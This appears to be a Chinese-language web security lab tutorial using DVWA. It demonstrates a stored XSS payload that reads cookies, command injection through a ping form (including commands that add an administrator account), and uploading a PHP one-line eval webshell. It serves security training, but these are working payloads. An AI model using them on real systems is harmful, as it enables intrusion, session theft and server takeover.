<pre><code>"&gt;＜script＞alert（document．cookie）＜/script＞
</code></pre><p>这条javascript语句即弹出当前会话的cookies。
提交后，我们看到，页面立即弹出了当前cookies：</p>
<p><img src="picture/img (84).png" alt="Alt text"></p>
<p>此时我们载入当前URL，可以看到当前URL为：</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/xss_s/
</code></pre><p>即我们提交的数据并没有在URL中体现：</p>
<p><img src="picture/img (85).png" alt="Alt text"></p>
<p>其实测试代码已经被写入数据库，任何访问到这个页面的人都将被执行恶意代码。</p>
<p>我们右键查看源代码可以看见，我们提交的Javascript代码<code>"&gt;＜script＞alert（document．cookie）＜/script＞</code>在页面的html中并没有被过滤，可以正常执行：</p>
<p><img src="picture/img (86).png" alt="Alt text"></p>
<p>此为最经典的存储型XSS漏洞。</p>
<h3 id="-">实验结果分析与总结</h3>
<p>作为测试人员，需要了解XSS的原理，攻击场景，如何修复。 才能有效的防止XSS的发生。</p>
<p>如上只是简单演示了最基本的漏洞发现与利用XSS漏洞的过程，更为深层次的XSS漏洞发掘还需更深入的研究JS脚本等。</p>
<h3 id="-">思考</h3>
<ol>
<li><p>反射型XSS和存储型XSS有什么区别，有什么相同点？</p>
</li>
<li><p>如果页面过滤或转义了一些特殊字符，你有简单的绕过思路吗？</p>
</li>
<li><p>你能想到哪些高级的反射型XSS漏洞利用方式？</p>
</li>
<li><p>结合前面的内容，除了读取cookies，你还能想出哪些信息可以通过xss获得？</p>
</li>
</ol>
</div>

### 其他的一些漏洞  

<div id="sectionDoc" class="markdown-body czsc_con smallTxt "><h3 id="-">实验目的</h3>
<p>通过本实验，分析与利用命令执行漏洞
、文件上传漏洞。</p>
<h3 id="-">实验工具</h3>
<blockquote>
<ul>
<li><strong>DVWA </strong>:&gt;   DVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。</li>
</ul>
</blockquote>
<h3 id="-">实验内容</h3>
<blockquote>
<p>通过本部分学习发现和利用命令执行漏洞与文件上传漏洞</p>
</blockquote>
<ul>
<li><strong>本部分概览</strong><ul>
<li>分析与利用命令执行漏洞</li>
<li>分析与利用文件上传漏洞</li>
</ul>
</li>
</ul>
<h3 id="-">实验步骤</h3>
<h4 id="-1-">步骤1 分析与利用命令执行漏洞</h4>
<p>下面我们开始分析DVWA中的<code>Command Execution</code>命令执行漏洞。
首先仍是将<code>DVWA Security</code>设置为<code>Low</code>，</p>
<p><img src="picture/img (69).png" alt="Alt text"></p>
<p>选择<code>Command Execution</code>，这里在文本框中输入一个IP，我们这里选择输入超级本地IP<code>127.0.0.1</code>进行测试，点击<code>Submmit</code>提交便可以执行ping命令。</p>
<p><img src="picture/img (87).png" alt="Alt text"></p>
<p>我们来分析下这个程序的后端源码有助于理解如何发掘漏洞，源码如下：</p>
<pre><code>＜?php

if( isset( $_POST[ "Submit" ]  ) ) {
 // Get input
 $target = $_REQUEST[ "ip" ];

 // Determine OS and execute the ping command.
 if( stristr( php_uname( "s" ), "Windows NT" ) ) {
  // Windows
  $cmd = shell_exec（ "ping  " . $target ）;
 }
 else {
  // *nix
  $cmd = shell_exec（ "ping  -c 4 " . $target ）;
 }

 // Feedback for the end user
 $html .= "＜pre&gt;{$cmd}＜/pre&gt;";
}

?&gt;
</code></pre><p>可以看到，这里的数据是以post方式提交过来的，然后被赋值给了变量<code>$target</code>。
接下来有一个<code>if</code>语句，判断条件是<code>stristr(php_uname("s"), "Windows NT")</code>，这是用来判断当前的系统是否是Windows，因为Windows和Linux下的<code>ping</code>命令执行参数是不同的。
再下面是将函数<code>shell_exec（ "ping " . $target ）</code>的值赋值给变量<code>$cmd</code>，并输出<code>$cmd</code>的值，其实也就是在执行<code>shell_exec（ "ping " . $target ）</code>函数，因而<code>shell_exec（）</code>函数就是这里的核心了。
<code>shell_exec（）</code>函数的作用就是可以在PHP中去执行操作系统命令，因而如果不对用户输入的命令进行过滤，那么理论上就可以执行任意系统命令，也就相当于直接获得了系统级的Shell，因而命令包含漏洞的威力相比SQL注入要大多了。</p>
<p>比如我们在文本框中输入<code>127.0.0.1 | net user</code>，实际上就是通过管道符<code>|</code>去执行了<code>net user</code>命令。原理在下面介绍，那么我们完全可以继续执行<code>127.0.0.1 | net user test 123 /add</code>、<code>127.0.0.1 | net localgroup administrators test /add</code>命令，从而拿下整个服务器。（提权相关命令会在以后的课程里讲到）。</p>
<p>那么我们在这里仅仅做个漏洞的演示，不进行提权操作，尝试在输入框输入以下命令：</p>
<pre><code>127.0.0.1 &amp; tasklist
</code></pre><p>（<code>tasklist</code>命令用于列出进程表）
分析得知，其实后端服务器执行的命令是：</p>
<pre><code>ping 127.0.0.1 &amp; tasklist
</code></pre><p>于是实际测试如我们料想，<code>tasklist</code>命令也被执行：</p>
<p><img src="picture/img (88).png" alt="Alt text"></p>
<p>我们贴出执行结果，这是<code>ping</code>命令和<code>tasklist</code>两条命令执行后的结果：</p>
<pre><code>Pinging 127.0.0.1 with 32 bytes of data:

Reply from 127.0.0.1: bytes=32 time＜1ms TTL=128
Reply from 127.0.0.1: bytes=32 time＜1ms TTL=128
Reply from 127.0.0.1: bytes=32 time＜1ms TTL=128
Reply from 127.0.0.1: bytes=32 time＜1ms TTL=128

Ping statistics for 127.0.0.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

ͼ����                       PID �Ự��           �Ự#       �ڴ�ʹ�� 
========================= ====== ================ ======== ============
System Idle Process            0 Console                 0         28 K
System                         4 Console                 0        296 K
smss.exe                     380 Console                 0        444 K
csrss.exe                    596 Console                 0      6,732 K
winlogon.exe                 620 Console                 0     12,884 K
services.exe                 664 Console                 0      3,628 K
lsass.exe                    676 Console                 0      
.........
</code></pre><p>在DOS下允许同时执行多条命令的符号主要有以下几个：</p>
<blockquote>
<p><code>|</code>：前面命令输出结果作为后面命令的输入内容；
<code>||</code>：前面命令执行失败的时候才执行后面的命令；
<code>&amp;</code>：前面命令执行后接着执行后面的命令；
<code>&amp;&amp;</code>：前面命令执行成功了才执行后面的命令。</p>
</blockquote>
<p>如果是Linux系统，还可以使用分号<code>;</code>，也可以同时执行多条命令。
另外还可以使用重定向符号<code>&gt;</code>在服务器中生成文件.</p>
<p>最后，大家可以分别用上面这些符号，自己来构造语句去执行相应的命令。</p>
<p>如此，我们成功利用命令执行漏洞执行我们想要执行的命令。</p>
<h4 id="-2-">步骤2 分析与利用文件上传漏洞</h4>
<p>大多数的网站通常都会提供文件上传的功能，例如上传图片或是文档等，只要网站允许上传，就有可能存在上传漏洞。</p>
<p>上传漏洞与SQL注入相比，其风险更大，黑客利用上传漏洞的主要目的是将WebShell上传到网站中，从而达到控制网站甚至整个服务器的目的。在看过的很多黑客渗透实践案例中，上传漏洞和SQL注入都是两种并重的主流攻击手法。</p>
<p>下面我们开始分析DVWA中的文件上传漏洞。</p>
<p>在DVWA中的文件上传漏洞模块，我们首先分析low级别后端的代码：</p>
<pre><code>＜?php

if( isset( $_POST[ "Upload" ] ) ) {
 // Where are we going to be writing to?
 $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
 $target_path .= basename( $_FILES[ "uploaded" ][ "name" ] );

 // Can we move the file to the upload folder?
 if( !move_uploaded_file（ $_FILES[ "uploaded" ][ "tmp_name" ], $target_path ） ) {
  // No
  $html .= "＜pre&gt;Your image was not uploaded.＜/pre&gt;";
 }
 else {
  // Yes!
  $html .= "＜pre&gt;{$target_path} succesfully uploaded!＜/pre&gt;";
 }
}

?&gt;
</code></pre><p>首先站点通过upload参数以POST方式来接收被上传的文件，然后指定文件上传路径为<code>网站根目录/hackable/uploads</code>，文件上传到网站之后的名字仍沿用原先的名字。</p>
<p>接下来利用<code>$_FILES</code>变量来获取上传文件的各种信息。<code>$_FILES</code>变量与<code>$_GET</code>、<code>$_POST</code>类似，它专门用于获取上传文件的各种信息。
<code>$_FILES["uploaded"]["name"]</code>，用于获取客户端文件的原名称，
<code>$_FILES["uploaded"]["tmp_name"]</code>， 用于获取文件被上传后在服务端储存的临时文件名。</p>
<p>语句<code>move_uploaded_file（$_FILES["uploaded"]["tmp_name"], $target_path）</code>表示将上传后的文件移动到变量<code>$target_path</code>所指定的新位置，如果这个函数成功执行，则输出“<code>succesfully uploaded!</code>”，否则输出<code>“Your image was not uploaded”</code>。</p>
<p>我们来实际测试下：</p>
<p>首先仍是将<code>DVWA Security</code>设置为<code>Low</code>，</p>
<p><img src="picture/img (69).png" alt="Alt text"></p>
<p>选择<code>File Upload</code>，进入文件上传漏洞模块：</p>
<p><img src="picture/img (89).png" alt="Alt text"></p>
<p>我们先在桌面新建一个经典的恶意脚本文件，一句话php脚本木马，脚本名为<code>hack.php</code>，文件内容如下：</p>
<pre><code>＜?php @eval（$_POST["pass"]）;?&gt;
</code></pre><p>关于一句话木马脚本的使用，我们在以后的课程里会介绍。</p>
<p>我们尝试上传<code>hack.php</code>，点击<code>浏览</code>，选择我们桌面的<code>hack.php</code>，然后点击<code>Upload</code>上传：</p>
<p><img src="picture/img (90).png" alt="Alt text"></p>
<p>如上图，果然没有做任何的过滤，php类型文件被直接上传，并且返回的上传后的文件路径：</p>
<pre><code>../../hackable/uploads/hack.php
</code></pre><p>当前上传页面的URL为:</p>
<pre><code>http://www.test.test/dwva/vulnerabilities/upload/#
</code></pre><p>文件上传后的路径前有两个<code>../</code>，即相对于当前页，该文件的绝对路径要向前推两级，于是推断出<code>hack.php</code>的URL路径为：</p>
<pre><code>http://www.test.test/dwva/hackable/uploads/hack.php
</code></pre><p>我们尝试在浏览器中访问之：</p>
<p><img src="picture/img (91).png" alt="Alt text"></p>
<p>虽然一片空白，但是没有显示404错误代码，即文件成功上传且我们也取得了文件的正确URL地址。</p>
<p>如此，我们通过文件上传漏洞成功取得了一个webshell。</p>
<h3 id="-">实验结果分析与总结</h3>
<p>限于实验篇幅，我们这里在介绍了除了以上几个最常用的web漏洞之外，引入了命令执行漏洞和文件上传漏洞，仅以简单的例子做实验，关键在于理解漏洞原理和渗透测试过程。</p>
<h3 id="-">思考</h3>
<ol>
<li><p>如果目标机限制了文件类型上传，并且存在文件包含漏洞，你会利用吗？</p>
</li>
<li><p>若目标存在命令执行漏洞，但目标处于内网，无法直接提权得到服务器，你能想办法取得shell吗？</p>
</li>
</ol>
</div>

# 实验总结
把实验中遇到的问题及解决办法或体会写出来就行了。